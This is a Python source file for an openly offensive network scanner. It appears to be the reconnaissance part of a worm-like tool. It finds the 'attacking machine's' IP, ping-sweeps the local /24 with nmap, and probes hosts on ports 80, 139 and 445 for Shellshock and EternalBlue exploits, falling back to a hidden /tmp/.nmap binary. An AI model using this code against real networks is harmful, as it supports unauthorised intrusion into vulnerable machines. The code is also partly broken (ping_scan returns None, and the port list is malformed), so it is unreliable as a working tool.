#!/usr/bin/env python3

import sys
import socket
import subprocess
import re

socket.setdefaulttimeout(2)

#basic scanning utility class
class scanner:
    #class doesn't need external arguments upon instantiation
    def __init__(self):
        #declare regex matcher up here to save the headache
        self.ip_find = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
        return

    #figure out what the current ip address is from the system
    def get_self_ip(self):
        """
        Function to obtain the current ip address of the attacking machine
        """
        curr_platform = sys.platform
        #windows calls it 'ipconfig' instead of 'ifconfig'
        if curr_platform != 'linux':
            return self.ip_find.findall(str(subprocess.check_output('ipconfig')))[0]
        else:
            return self.ip_find.findall(str(subprocess.check_output('ifconfig')))[0]

    #rudimentary ping scan
    def ping_scan(self, ip_addr):
        """
        Function to initiate an nmap ping scan on the immedate network of the attacking machine
        """
        #assume 24 bit netmask
        ip_mask = '.'.join(ip_addr.split('.')[:-1]) + '.0/24'
        cmd = ['nmap', '-sn', ip_mask]
        cmd_alt = ['/tmp/.nmap', '-sn', ip_mask]
        try:
            scan_data = subprocess.check_output(' '.join(cmd), shell=True)
        except:
            scan_data = subprocess.check_output(' '.join(cmd_alt), shell=True)
        finally:
            return self.ip_find.findall(scan_data.decode()).remove(ip_addr)

    def identify_ports(self, ip_addr):
        """
        Function to initiate nmap scan of chosen hosts for the ports needed
        for our exploits: 80 for Shellshock, 139 & 445 for EternalBlue
        """
        cmd = ['nmap', '-Pn', '-O', '-A', '-p 80, 139, 445', ip_addr]
        cmd_alt = ['/tmp/.nmap', '-Pn', '-O', '-A', '-p 80, 139, 445', ip_addr]
        try:
            scan_data = subprocess.check_output(' '.join(cmd), shell=True)
        except:
            scan_data = subprocess.check_output(' '.join(cmd_alt), shell=True)
        finally:
            return scan_data.decode()
